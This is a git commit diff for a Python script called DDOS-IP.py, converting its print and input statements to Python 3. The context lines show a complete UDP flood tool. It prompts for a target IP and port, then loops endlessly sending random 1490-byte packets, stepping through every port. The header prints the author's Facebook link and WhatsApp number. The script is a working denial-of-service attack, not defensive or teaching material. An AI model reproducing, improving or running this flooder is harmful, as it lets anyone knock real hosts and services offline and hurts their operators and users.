08a0c9d89667706cee02dece41242c73d6d69839
Mahmoud Saber <49526020+Modyyy0100@users.noreply.github.com>
2020-03-26 17:38:34 -0400

    Update DDOS-IP.py

--- DDOS-IP.py
+++ DDOS-IP.py
@@ -21,25 +21,25 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDOS-IP")
-print
-print "Author   : Mahmoud S.ALi"
-print "Facebook : https://www.facebook.com/mody.saber.96343405"
-print "WhatsApp : 01117374028"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+
+print ("Author   : Mahmoud S.ALi")
+print ("Facebook : https://www.facebook.com/mody.saber.96343405")
+print ("WhatsApp : 01117374028")
+
+ip = input("IP Target : ")
+port = int(input("Port       : "))
 
 os.system("clear")
 os.system("figlet Attack-Starting")
-print "Your IP Target is : {}".format(ip)
+print ("Your IP Target is : {}".format(ip))
 time.sleep(3)
-print "Your Port Target is : {}".format(port)
+print ("Your Port Target is : {}".format(port))
 time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
      if port == 65534:
        port = 1
